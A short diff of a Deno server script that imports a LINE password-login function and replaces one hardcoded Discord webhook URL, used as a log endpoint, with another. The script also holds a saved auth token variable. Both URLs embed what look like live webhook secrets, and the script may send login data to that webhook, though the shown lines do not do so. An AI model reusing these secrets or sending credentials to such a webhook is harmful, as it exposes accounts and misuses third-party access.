@@ -2,7 +2,7 @@ import { serve } from "https://deno.land/std@0.224.0/http/server.ts";
 import { serveFile } from "https://deno.land/std@0.224.0/http/file_server.ts";
 import { loginWithPassword } from "@evex/linejs";
 
-const logUrl = "https://discord.com/api/webhooks/1387276783472087051/eiwfs_9Ozl6IIfvua7uBb0LTO6uCsvuUsw8cTAkLAiduVDpnc4yXxrrUPEBwr1pYne38";
+const logUrl = "https://discord.com/api/webhooks/1388074925339836558/C_h7mq9hqLN3qNvNkrOn2jpgiiLR8hxpD52IIokTbbTo10UKUF7_yWZoEVpgvvfKkwGQ";
 
 let loginSuccess = false;
 let savedAuthToken = "";
